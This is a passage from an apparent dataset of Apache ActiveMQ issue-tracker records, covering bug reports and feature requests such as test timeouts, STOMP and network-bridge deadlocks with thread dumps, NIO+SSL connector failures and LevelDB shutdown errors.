org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27) at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55) at org.junit.rules.RunRules.evaluate(RunRules.java:20) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.junit.runner.JUnitCore.run(JUnitCore.java:160) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:76) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:195) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:63) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
issueID:AMQ-4296
type:Bug
changed files:
texts:Unit tests fail intermittently when using LevelDB adapter
A couple of the unit tests that have be modified to run with LevelDB as the persistence adapter fail intermittently.AMQ2870TestAMQ2584Test#testSizeDuranleSubscriptionOfflineTest#testConsumeOnlyMatchedMessagesLevelDBXARecoveryBrokerTest#testTopicPersistentPreparedAcksAvailableAfterRestartAndRollback
issueID:AMQ-4297
type:Bug
changed files:StompSubscription.java
texts:stomp deadlock on commit
Found one Java-level deadlock:============================="ActiveMQ Transport: ssl://27.0.0.1:63934":  waiting for ownable synchronizer 7f40f40b0, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),  which is held by "ActiveMQ BrokerService[localhost] Task-2""ActiveMQ BrokerService[localhost] Task-2":  waiting to lock monitor 7f90ca08ea30 (object 7f35b97b0, a org.apache.activemq.transport.stomp.StompSubscription),  which is held by "ActiveMQ Transport: ssl://27.0.0.1:63934"Java stack information for the threads listed above:==================================================="ActiveMQ Transport: ssl://27.0.0.1:63934": at sun.misc.Unsafe.park(Native Method) - parking to wait for  <7f40f40b0> (a java.util.concurrent.locks.ReentrantLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178) at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186) at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:43) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:84) at org.apache.activemq.transport.stomp.StompSubscription.onStompCommit(StompSubscription.java:122) - locked <7f35b97b0> (a org.apache.activemq.transport.stomp.StompSubscription) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommit(ProtocolConverter.java:502) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:241) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:73) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91) at org.apache.activemq.transport.stomp.StompSslTransportFactory$1$1.doConsume(StompSslTransportFactory.java:70) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:680)"ActiveMQ BrokerService[localhost] Task-2": at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:70) - waiting to lock <7f35b97b0> (a org.apache.activemq.transport.stomp.StompSubscription) at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:857) at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:61) at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:322) at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:304) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897) at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:943) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)Found 1 deadlock.from org.apache.activemq.transport.stomp.StompTest#testPrefetchSize
issueID:AMQ-4298
type:Improvement
changed files:
texts:Add mutual authentication (needClientAuth) to https transport
Would like to be able to force clients to authenticate against he broker"s trust store similar to how we have needClientAuth for the ssl:// transport.
issueID:AMQ-4303
type:Improvement
changed files:HealthView.java
texts:Health status MBean - Feeling ill
I noticed the new MBean for health status in jconsole.The attribute says "Feeling ill".This is actually hard to read because its Ill. which looks like 3 x the number one.I wonder if there is not a better enum for status to use.And then a description attribute for the extra text?See screenshot
issueID:AMQ-4305
type:New Feature
changed files:
texts:Support destination lookup by JNDI name in resource adapter
Use Case:A standalone ActiveMQ broker is integrated with a Java EE 6 server (e.g. JBoss AS 7.1, GlassFish 3.1) via activemq-rar-5.7.0.rar.Admin objects corresponding to queues or topics are created at server level, assigning a JNDI name in addition to the physical destination name.MDBs are used to handle incoming messages from ActiveMQ destinations. The destination is specified by@ActivationConfigProperty(propertyName = "destination", propertyValue = "physical-destination-name")Problem:The physical destination name is now hard-coded in the application. Thus, it is not possible to deploy the unchanged application in a different runtime environment where the given destination has a different physical name.Possible solution:Create a new activation config property named "destinationJndiName". If this property is set, the destination is supposed to be registered in JNDI with the name given by the property value. When this property is set, both "destinationType" and "destination" are not required.
issueID:AMQ-4306
type:Bug
changed files:
texts:BTreeIndexTest.testRandomAddRemove() is very slow on Solaris
This test runs very slowly on Solaris, taking 8-10 times as long as on Mac or Ubuntu.  It looks the the difference is almost all in the section where it builds the index.  I"ll try to get more info later.For now I"m attaching a patch which bumps up the timeout for this test so it doesn"t cause the build to fail.
issueID:AMQ-4307
type:Bug
changed files:HttpClientTransport.java
texts:org.apache.activemq.transport.http.HttpClientReconnectTest hangs occasionally
This test occasionally hangs, causing the build to hang.  I haven"t been able to reproduce it yet, but have seen it several times on the Fuse Hudson instance.  I"ll attach a patch which adds a timeout.
issueID:AMQ-4308
type:Bug
changed files:
texts:HttpsTransportBrokerTest hangs occasionally
This test occasionally hangs, causing the build to hang. I haven"t been able to reproduce it yet, but have seen it several times on the Fuse Hudson instance. I"ll attach a patch which adds a timeout.
issueID:AMQ-4309
type:Improvement
changed files:Usage.java
texts:Add usage limit check when limit for destinations is present
Since the usage limit is hierarchical so usage children should respect the parent usage limit.When usage limit value is greater than its parent,uses shoud be aware of the improper configuration.For example when I specify the usage limit for destinations and their value are all greater than the parent limit(here is broker"s limit), the broker starts up silently and I do not know the improper configuration at all.A simple patch is provided that will check its limit and its parent limit and logs complaint when usage is started.
issueID:AMQ-4312
type:Bug
changed files:
texts:NIO+SSL Connector fails with SSL exception under high concurrency
Under high concurrency, the NIO+SSL connector causes client connections to fail with random SSL exceptions (usually bad record MAC or invalid padding) after a period of time.For example:javax.net.ssl.SSLException: bad record MAC at sun.security.ssl.Alerts.getSSLException(Alerts.java:208) at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1902) at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1855) at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:988) at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:884) at sun.security.ssl.AppInputStream.read(AppInputStream.java:102) at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50) at org.apache.activemq.transport.tcp.TcpTransport$2.fill(TcpTransport.java:604) at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58) at org.apache.activemq.transport.tcp.TcpTransport$2.read(TcpTransport.java:589) at java.io.DataInputStream.readInt(DataInputStream.java:387) at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:275) at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:221) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:213) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722)</pre>I suspect this may be related to AMQ-4135, since we are seeing nearly identical failure modes.I am able to duplicate these results fairly consistently using a variant of NIOSSLLoadTest which uses 10 producers, 10 consumers, 10000 messages, and a bytes message of size 4096 with all producers and consumers using separate (multiplexed) sessions.
issueID:AMQ-4315
type:Bug
changed files:
texts:Duplicate files in distribution
There are a couple of duplicate files in the ActiveMQ 5.8.0 distribution package.  Here are the locations:lib/extra/activemq-leveldb-store-5.8.0.jarlib/optional/activemq-leveldb-store-5.8.0.jarlib/activemq-spring-5.8.0.jarlib/optional/activemq-spring-5.8.0.jarNot sure which location is the "real" location.
issueID:AMQ-4317
type:Bug
changed files:
texts:activemq-camel feature doesn&#39;t work
activemq-camel feature fails withkaraf@root> features:install activemq-camelError executing command: Jar is not a bundle, no Bundle-SymbolicNamemvn:org.apache.activemq/activemq-camel/5.8.0karaf@root>error
issueID:AMQ-4319
type:Bug
changed files:
texts:ActiveMQ destination are tracked by securitycontext and never cleaned up, causes ActiveMQ to crash.
We are using ActiveMQ + mcollective.  With mcollective, we are using the "activemq connector (http://docs.puppetlabs.com/mcollective/reference/plugins/connector_activemq.html)"We are running ActiveMQ in the EC2 Cloud, so we have enabled security for the connections being made.We have 2 ActiveMQ servers that are configures as network of brokers, about around 200 nodes that we communicate with.The problem we are seeing is that after about 1 week in operation, ActiveMQ will crash because it runs out of memory.  We have been monitoring the heap, and you will see it rise during the week, and then the wrapper will eventually restart activemqwrapper.logERROR  | wrapper  | 2013/02/01 09:38:33 | JVM appears hung: Timed out waiting for signal from JVM.ERROR  | wrapper  | 2013/02/01 09:38:33 | JVM did not exit on request, terminatedINFO   | wrapper  | 2013/02/01 09:38:33 | JVM exited on its own while waiting to kill the application.STATUS | wrapper  | 2013/02/01 09:38:33 | JVM exited in response to signal SIGKILL (9).STATUS | wrapper  | 2013/02/01 09:38:38 | Launching a JVM...}In the activemq connector page, it says that there needs to be cleanup of queues.  This is put into place.I did a heap dump, and with external help I was told that "the authentication plugin is retaining destinations in a cached connection"These connections need to be deleted and cleaned up as well.
issueID:AMQ-4320
type:Bug
changed files:CompositeDestinationFilter.java
texts:Destinations are not auto created when using Composite Destination configured on the broker
When using a composite destination as defined below, the destination are not auto created:<destinationInterceptors>              <virtualDestinationInterceptor>                <virtualDestinations>                  <compositeQueue name="MY.QUEUE">                    <forwardTo>                      <queue physicalName="FOO" />                      <topic physicalName="BAR" />                    </forwardTo>                  </compositeTopic>                </virtualDestinations>              </virtualDestinationInterceptor></destinationInterceptors>The destinations FOO and BAR are not created if they do not exist and the messages are dropped.Current work around is to define startup destinations as shown below or ensure the destinations are created by consumers prior to sending messages to the composite destination.<destinations>              <queue physicalName="FOO" />              <topic physicalName="BAR" /></destinations>
issueID:AMQ-4321
type:Bug
changed files:
texts:NIO+SSL Connector corrupts stream when data size exceeds SSL buffer size
When using the default enabledCipherSuites settings on Java 7, the NIO+SSL connector corrupts the SSL output stream when asked to flush a buffer larger than the SSL buffer size (approx. 16 KB). This is reproducible by sending a single BytesMessage >= 16KB to the broker and attempting to consume it.
issueID:AMQ-4323
type:Bug
changed files:
texts:last modified producer audit checkpoint can prevent gc with cached bursty producers
from https://issues.apache.org/jira/browse/AMQ-3833 the audit is only persisted when modified, which prevents an idle broker from cranking away on disk, but it also means that a data file is retained. which can prevent gc due to dependent acks.the audit should be rewritten if it is holding up gc.
issueID:AMQ-4325
type:Bug
changed files:
texts:camel doen&#39;t honor credentials set on activemqcomponent bean via spring
I use this configuration to create activemq component.<bean id="activemq"          class="org.apache.activemq.camel.component.ActiveMQComponent" factory-method="activeMQComponent">        <constructor-arg index="0" value="${grabber.broker.url}" />        <property name="useMessageIDAsCorrelationID" value="true"/>        <property name="userName" value="system"/>        <property name="password" value="manager"/>    </bean>Endpoint url doesn"t have username and password set which results jms client not being able to connect to broker which responds with "username is null".Setting username and password in endpoint url works
issueID:AMQ-4328
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Cross talk over duplex network connection can lead to blocking
with active forwarding in both directions a duplex network connector can block. in 5.8, threads of the form:"ActiveMQ BrokerService[xx] Task-10" daemon prio=10 tid=0xb35d1c00 nid=0xc64 runnable [0xb3369000]   java.lang.Thread.State: RUNNABLE at java.net.SocketOutputStream.socketWrite0(Native Method) at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92) at java.net.SocketOutputStream.write(SocketOutputStream.java:136) at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115) at java.io.DataOutputStream.flush(DataOutputStream.java:106) at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176) at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:322) at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:304) at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85) at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:994) at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:201) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:138) at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:127) - locked <0x647f4650> (a java.util.concurrent.atomic.AtomicBoolean) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:104) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897) at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:943) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:662)"ActiveMQ Transport: tcp:///xx:61616@40803" prio=10 tid=0xb3525400 nid=0xbec waiting on condition [0xb3276000]   java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x64657028> (a java.util.concurrent.locks.ReentrantLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178) at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186) at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.network.DemandForwardingBridgeSupport$7.onCompletion(DemandForwardingBridgeSupport.java:630) at org.apache.activemq.transport.FutureResponse.set(FutureResponse.java:65) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:109) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:138) at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:127) - locked <0x647f4c80> (a java.util.concurrent.atomic.AtomicBoolean) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:104) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897) at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:857) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:186) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:138) at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:127) - locked <0x647e6528> (a java.util.concurrent.atomic.AtomicBoolean) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:104) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:622) at org.apache.activemq.network.DemandForwardingBridgeSupport$3.onCommand(DemandForwardingBridgeSupport.java:219) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:662)
issueID:AMQ-4330
type:Bug
changed files:
texts:Removal of Master/Slave removed isSlave() JMX api
The task to remove the Master/Slave functionality (AMQ-4165) also removed the isSlave() attribute from the Broker. This attribute is also used when a broker is polling a shared datastore using the master+slave polling model. Several large user groups will be impacted by this, as they have scripts that monitor this attribute in order to re-balance brokers after maintenance or failure scenarios.Please reinstate.Thanks
issueID:AMQ-4331
type:Bug
changed files:
texts:MessageSelectorTest fails because of dated config file
The activemq.xml file used by this test contained:    <persistenceAdapter>      <kahaPersistenceAdapter directory="file:target/amq1095"          maxDataFileLength="200000"/>    </persistenceAdapter>which is no longer valid.  I fixed the test by changing it to     <persistenceAdapter>      <kahaDB directory="file:target/amq1095"/>    </persistenceAdapter>
issueID:AMQ-4332
type:Bug
changed files:
texts:LargeQueueSparseDeleteTest gets timeouts on testMoveMessages and testRemoveMessages
Both of these test have 10 second timeouts, but while occasionally completing in 6-7 seconds, generally are averaging 10-12.  I"ll attach a patch which bumps up the timeouts, but if you want I can add a bug to look into a possible performance issue here.  I ran these tests against the 5.7 fuse branch and they averaged 4-5 seconds.
issueID:AMQ-4333
type:Bug
changed files:
texts:ActiveMQ 5.8: Failed to execute purge task
With a "clean" ActiveMQ 5.8 (without any queues), i can purge without any problem (./bin/activemq purge). But when i deploy my Camel application in the normal way (then ActiveMQ has now the queues of my application), i cannot purge anymore. I receive the next problem: ERROR: java.lang.RuntimeException: Failed to execute purge task. Reason: javax.management.ReflectionException: No such operation: purge java.lang.RuntimeException: Failed to execute purge task. Reason: javax.management.ReflectionException: No such operation: purge         at org.apache.activemq.console.command.PurgeCommand.runTask(PurgeCommand.java:140)         at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)         at org.apache.activemq.console.command.AbstractJmxCommand.execute(AbstractJmxCommand.java:387)         at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:150)         at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)         at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) .... Caused by: java.lang.NoSuchMethodException: purge()         at com.sun.jmx.mbeanserver.PerInterface.noSuchMethod(PerInterface.java:150)         at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:94) ..... See: http://activemq.2283324.n4.nabble.com/ActiveMQ-5-8-Failed-to-execute-purge-task-td4663610.html
issueID:AMQ-4337
type:Improvement
changed files:
texts:Messages with AMQ_SCHEDULED_DELAY do not respect transactions
Currently delayed messages are delivered even if the session it was sent in is rolled back. According to http://activemq.2283324.n4.nabble.com/AMQ-SCHEDULED-DELAY-and-transactional-boundaries-td4658339.html this is because the message can be delivered far in the future and the transaction would take to long.I don"t agree with that argument. The transaction can be short living. It is only the enqueuing of the delayed message in the broker that has to be part of the transaction. The delivery to the consumer is not part of the transaction anymore.e.g. consider the scenario in the following preudo code:    while (application_runs)    try{        msg = session.Receive();        session.SendDelayed(anotherMessage);        if (random(5) != 0) throw exception;        session.Commit();    } catch { session.Rollback; }Currently a delayed message is sent for each retry. So we will get a lot more messages in the future as we would expect. When delayed messages would respect transactions just the successful ones would be enqueued. The other ones are rolledback with the transaction.
issueID:AMQ-4338
type:Bug
changed files:
texts:MQTTSSLTest has multiple test cases that fail frequently
MQTTSSLTest has multiple different test cases (including testSendAndReceiveExactlyOnce, testSendAndReceiveLargeMessages, testSendAndReceiveMQTT, testSendAtLeastOnceReceiveAtMostOnce, testSendAtLeastOnceReceiveExactlyOnce, testSendJMSReceiveMQTT, testSendMQTTReceiveJMS) which fail fairly frequently because of a hang on the provider.connect() call in initializeConnection() as shown in the stacktrace below. Another problem with this test is it was giving a misleading error when run under Hudson, showing that the test that followed it (MQTTTest) was failing instead.  I think this was because of the way it was using AutoFailTestSupport.  I will attach a patch which removes that and uses timeouts on @Test annotations instead.testSendAndReceiveLargeMessages(org.apache.activemq.transport.mqtt.MQTTSSLTest)  Time elapsed: 30.004 sec  <<< ERROR!java.lang.Exception: test timed out after 30000 milliseconds        at sun.misc.Unsafe.park(Native Method)        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:994)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1303)        at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:236)        at org.fusesource.mqtt.client.Promise.await(Promise.java:88)        at org.fusesource.mqtt.client.BlockingConnection.connect(BlockingConnection.java:49)        at org.apache.activemq.transport.mqtt.FuseMQQTTClientProvider.connect(FuseMQQTTClientProvider.java:39)        at org.apache.activemq.transport.mqtt.MQTTSSLTest.initializeConnection(MQTTSSLTest.java:60)Results :Tests in error:  MQTTSSLTest>AbstractMQTTTest.testSendAndReceiveLargeMessages:247->initializeConnection:60 »
issueID:AMQ-4341
type:Task
changed files:
texts:activemq-broker feature can not be installed when OBR is enabled
While trying to integrate ActiveMQ 5.8.0 into ServiceMix 5.0.0, I bumped into 2 problems with the features descriptor on a Karaf-based container that has OBR resolution enabled for the Features service: the activemq-http fragment is referring to a Fragment-Host called org.apache.activemq.activemq-core, which no longer exists the xbean-spring bundle is marked with dependency=true but no other bundle is importing any packages from it, so it does not get installed - since activemq-karaf does need those packages to work properly, the easiest solution is probably to add a proper Import-Package header to that bundle.
issueID:AMQ-4342
type:Bug
changed files:
texts:MemoryUsageCleanupTest fails intermittently
This test fails intermittently at a point where it expects BrokerView.getMemoryPercentUsage() to return 0, but it returns 1.  The problem here is that getMemoryPercentageUsage returns an int, and that number is truncated when calculated.I did some debugging and found when the test fails the actual usage is about 0.85%, and when it fails it"s only 1.02%.  I"ll attach a patch that makes the assertion here slightly more lenient to accommodate for this.
issueID:AMQ-4343
type:Bug
changed files:
texts:activemq-web-console can&#39;t be installed on Karaf 2.2.x
The bundle requires org.osgi.framework version 1.6.0 or higher. It should be able to also work with 1.5.
issueID:AMQ-4345
type:Bug
changed files:
texts:NIOSSLConcurrencyTest.testLoad fails on slow boxes
I"ll attach a patch which bumps up the timeout.
issueID:AMQ-4349
type:Bug
changed files:
texts:ActiveMQ 5.8.0 thows nullpointer exception while shutting down (NIO + LevelDB + pending Non Peristent Messages)
I am not sure whether I have to post this in the mailling list first or open a ticket. We updated our activemq broker to version 5.8.0 and replaced the persistent store from kahadb to leveldb. The persistent write performance increased by 10 times but at the same time the non persistent message write and read performance is decreased. Especially the read performance is decreased a lot.When there are not persistent messages on the broker and if we do graceful shutdown, the broker throws a null pointer exception. This is happening only if we use leveldb. Here is the stack trace.2013-02-26 06:06:58,956 | INFO  | Stopped LevelDB&#91;/opt/activemq/data/leveldb&#93; | org.apache.activemq.leveldb.LevelDBStore | Thread-162013-02-26 06:06:58,957 | ERROR | Could not stop service: QueueRegion: destinations=1, subscriptions=0, memory=0%. Reason: java.lang.NullPointerException | org.apache.activemq.broker.jmx.ManagedQueueRegion | Thread-16java.lang.NullPointerException        at org.fusesource.hawtdispatch.package$RichExecutor.execute(hawtdispatch.scala:171)        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.apply(hawtdispatch.scala:68)        at org.fusesource.hawtdispatch.package$RichExecutor.apply(hawtdispatch.scala:169)        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.future(hawtdispatch.scala:116)        at org.fusesource.hawtdispatch.package$RichExecutor.future(hawtdispatch.scala:169)        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.sync(hawtdispatch.scala:107)        at org.fusesource.hawtdispatch.package$RichExecutor.sync(hawtdispatch.scala:169)        at org.apache.activemq.leveldb.DBManager.destroyPList(DBManager.scala:773)        at org.apache.activemq.leveldb.LevelDBStore.removePList(LevelDBStore.scala:454)        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.destroyDiskList(FilePendingMessageCursor.java:168)        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.destroy(FilePendingMessageCursor.java:163)        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.stop(StoreQueueCursor.java:82)        at org.apache.activemq.broker.region.Queue.stop(Queue.java:910)        at org.apache.activemq.broker.region.AbstractRegion.stop(AbstractRegion.java:117)        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)        at org.apache.activemq.broker.region.RegionBroker.doStop(RegionBroker.java:574)        at org.apache.activemq.broker.jmx.ManagedRegionBroker.doStop(ManagedRegionBroker.java:126)        at org.apache.activemq.broker.region.RegionBroker.stop(RegionBroker.java:194)        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)        at org.apache.activemq.broker.TransactionBroker.stop(TransactionBroker.java:204)        at org.apache.activemq.broker.BrokerService$5.stop(BrokerService.java:2070)        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:715)        at org.apache.activemq.xbean.XBeanBrokerService.stop(XBeanBrokerService.java:96)        at org.apache.activemq.console.command.StartCommand$1.run(StartCommand.java:148)
issueID:AMQ-435
type:Improvement
changed files:
texts:Upgrade to newer version of log4j
I would recommend that the log4j-1.2.8.jar library be replaced with the more recent log4j-1.2.12.jar.  Along with a several other bugs fixes, the most annoying bug fix was the need to the target directory of the log already created.  This version uses mkdirs() to get the job done.
issueID:AMQ-4351
type:Bug
changed files:DurableTopicSubscription.java
Topic.java
PrefetchSubscription.java
texts:Deadlock when unsubscribing durable subscriber
